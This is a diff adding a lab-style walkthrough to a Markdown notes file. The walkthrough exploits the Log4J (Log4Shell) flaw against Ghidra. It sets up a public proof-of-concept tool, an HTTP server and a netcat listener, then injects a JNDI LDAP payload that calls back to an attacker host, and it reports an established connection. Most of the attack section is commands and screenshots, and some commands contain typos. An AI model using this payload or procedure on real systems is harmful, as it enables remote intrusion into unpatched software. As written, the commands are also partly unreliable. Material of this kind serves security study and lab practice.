@@ -620,6 +620,60 @@ target side:
 # VLC msfconsole:  
 
 
+# Log4J vulnerability :
+## Installation :  
+
+```git clone https://github.com/kozmer/log4j-shell-poc```
+
+![image](https://user-images.githubusercontent.com/97077110/149281113-f57e1edf-0845-4c47-bc0c-47334f8f8724.png)  
+
+```pip install -r requirements.txt```  
+![image](https://user-images.githubusercontent.com/97077110/149281805-f11e9f26-2640-43c3-a7f5-f8d70d9b5059.png)
+ 
+Log4J require a JDK file that can be downloaded from:  
+```https://www.oracle.com/java/technologies/downloads/```  
+
+Move the file from downloads to the log4j-shell-proc directory:  
+```sudo mv jdk-8u202-linux-1586.tar.gz /home/kali/log4j-shell-proc```  
+![image](https://user-images.githubusercontent.com/97077110/149284324-3a4a9672-a21b-4899-8b13-19dfb3ac0fa9.png)  
+
+Extract the file the log4j-shell-poc:  
+```sudo tar -xf jdk-8u202-linux-i586.tar.gz```
+![image](https://user-images.githubusercontent.com/97077110/149284550-bf5bb89b-6124-4cee-aa7a-a842fdc4300a.png)  
+
+Start the http server at log4j-shell-poc:  
+sudo python3 -m http.server 8081
+![image](https://user-images.githubusercontent.com/97077110/149284764-586bb774-c883-4f86-a126-b8e75c85e94c.png)  
+
+Start a netcat listener   
+```nc-lvnp 1389```
+
+![image](https://user-images.githubusercontent.com/97077110/149284876-5492d201-f847-4850-92fe-6b3c8c38f927.png)
+
+
+Start Log4j-shell-poc :  
+Run command python3 poc.py --userip (Host ip)
+![image](https://user-images.githubusercontent.com/97077110/149285077-e1b43750-6052-4286-b81c-2ac0918444b7.png)    
+
+A payload is generated : ${jndi:ldap://l72.16.36.11:1389/a}
+
+
+Target side :  
+We can insert the code to the search filter of GHIDRA
+
+![image](https://user-images.githubusercontent.com/97077110/149285158-a6eb9225-2690-4714-bb2e-34bcc638b16d.png)
+
+
+
+Attacker side:  
+A connection is established  
+![image](https://user-images.githubusercontent.com/97077110/149285441-7809f5e5-494b-4c9f-9330-fff55d4fcc2d.png)  
+
+![image](https://user-images.githubusercontent.com/97077110/149285349-4009e9d8-ee61-481f-8d21-8432d024a195.png)
+
+
+
+
 
 
 
